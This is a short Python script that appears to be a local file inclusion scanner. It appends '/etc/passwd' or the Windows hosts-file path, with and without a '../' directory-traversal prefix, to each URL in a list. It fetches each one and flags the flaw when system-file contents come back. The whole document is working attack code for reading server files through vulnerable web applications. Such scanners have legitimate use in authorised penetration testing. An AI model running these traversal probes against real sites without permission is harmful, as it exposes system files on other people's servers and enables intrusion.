import requests

win = "C:/WINDOWS/System32/drivers/etc/hosts"
lin = "/etc/passwd"
dirtrav = "../../../../../../.."


def linux_lfi():
	# do a linux lfi check using /etc/passwd file
	with open('lfi-test_urls','r')as lfi:
		for url in lfi:
			url = url.strip('\n')+lin
			r = requests.get(url)
			r = r.text
			if "root:x" in r:
				print("lfi present in "+url)		
				

			else:
                                print("no direct linux lfi present")

linux_lfi()

def linux_dirtrav():
    with open('lfi-test_urls', 'r') as lfi:
        for url in lfi:
            url = url.strip('\n') + dirtrav + lin
            r = requests.get(url)
            r = r.text
            if "root:x" in r:
                print("lfi present in " + url)
               
            else:
                print("no linux lfi present using directory traversal")
                
linux_dirtrav()



def windows_lfi():
	# do a windows lfi check using windows hosts file
	with open('lfi-test_urls','r')as lfi:
		for url in lfi:
			url = url.strip('\n')+win
			r = requests.get(url)
			r = r.text
			if "This is a sample HOSTS file" in r:
				print("lfi present in "+url)
				
				
			else:
                                print("no direct windows lfi present")
windows_lfi()

def windows_dirtrav():
	with open('lfi-test_urls','r')as lfi:
		for url in lfi:
			url = url.strip('\n')+dirtrav+win
			r = requests.get(url)
			r = r.text
			if "This is a sample HOSTS file" in r:
				print("lfi present in "+url)

			else:
                                print("no windows lfi present using directory traversal")

windows_dirtrav()




